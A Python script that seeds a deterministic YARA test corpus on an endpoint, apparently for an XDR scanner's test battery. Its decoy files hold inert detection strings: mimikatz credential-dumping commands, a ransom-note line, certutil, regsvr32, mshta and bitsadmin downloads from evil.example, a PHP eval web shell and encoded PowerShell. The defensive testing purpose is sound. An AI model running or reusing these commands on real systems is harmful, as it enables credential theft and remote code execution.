#!/usr/bin/env python3
"""Seed a deterministic YARA test corpus on an endpoint (stdlib only; runs under the
XDR agent Python or a plain system Python). Creates files that match the tests/yara_rules
battery so scans produce known hits, plus real binaries, a UTF-16 file, a high-entropy
blob, and a nested directory. Prints a manifest.
"""
import os
import platform
import shutil

CORPUS = "C:\\yara_corpus" if platform.system() == "Windows" else "/opt/yara_corpus"


def _write(path, data):
    d = os.path.dirname(path)
    if d:
        os.makedirs(d, exist_ok=True)
    mode = "wb" if isinstance(data, (bytes, bytearray)) else "w"
    with open(path, mode) as f:
        f.write(data)


def seed(root=CORPUS):
    os.makedirs(root, exist_ok=True)
    # 1) decoy with many detection strings
    _write(os.path.join(root, "decoy.txt"),
           "sekurlsa::logonpasswords gentilkiwi mimikatz kerberos::list lsadump::sam privilege::debug\n"
           "YOUR FILES HAVE BEEN ENCRYPTED - send bitcoin to nowhere .locked\n"
           "certutil -urlcache -split -f http://evil.example/x\n"
           "regsvr32 /s /n /u /i:http://evil.example  mshta http://evil.example  bitsadmin /transfer\n"
           "<?php eval($_POST['x']); ?>\n"
           "powershell -EncodedCommand ZQBjAGgAbwAgAGgAaQA= -NoProfile -WindowStyle Hidden\n"
           "ReflectiveLoader beacon.dll Invoke-Mimikatz FromBase64String cmd.exe /c start\n")
    # 2) EICAR test string
    _write(os.path.join(root, "eicar.txt"),
           "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n")
    # 3) IPs (regex)
    _write(os.path.join(root, "ip.txt"), "conn 10.10.0.16 -> 192.168.1.1 and 8.8.8.8\n")
    # 4) small file (<1KB)
    _write(os.path.join(root, "small.txt"), "tiny marker\n")
    # 5) wide / UTF-16LE
    _write(os.path.join(root, "wide.bin"),
           ("Notepad TOP-SECRET-WIDE-MARKER").encode("utf-16-le"))
    # 6) high-entropy blob (math.entropy)
    _write(os.path.join(root, "entropy.bin"), os.urandom(1024 * 1024))
    # 7) real binaries (PE on Windows, ELF on Linux)
    bins = ([os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32", b)
             for b in ("notepad.exe", "calc.exe")]
            if platform.system() == "Windows" else ["/bin/ls", "/bin/bash", "/usr/bin/python3"])
    for src in bins:
        try:
            if os.path.exists(src):
                shutil.copy(src, os.path.join(root, "bin_" + os.path.basename(src)))
        except Exception as e:
            print("copy fail", src, e)
    # 8) nested directory
    _write(os.path.join(root, "nested", "sub", "decoy2.txt"),
           "nested sekurlsa::logonpasswords EICAR-STANDARD-ANTIVIRUS-TEST-FILE\n")

    # manifest
    total = 0
    print("CORPUS_ROOT=" + root)
    for r, _dirs, files in os.walk(root):
        for f in files:
            p = os.path.join(r, f)
            try:
                sz = os.path.getsize(p); total += sz
                print("  %10d  %s" % (sz, p))
            except Exception:
                pass
    print("CORPUS_TOTAL_BYTES=%d" % total)


if __name__ == "__main__":
    import sys
    # Only honor an explicit path arg; ignore agent-injected flags (e.g. "-config")
    # so the seeder works identically as a standalone CLI and as an XDR snippet.
    _arg = sys.argv[1] if (len(sys.argv) > 1 and not sys.argv[1].startswith("-")) else CORPUS
    seed(_arg)
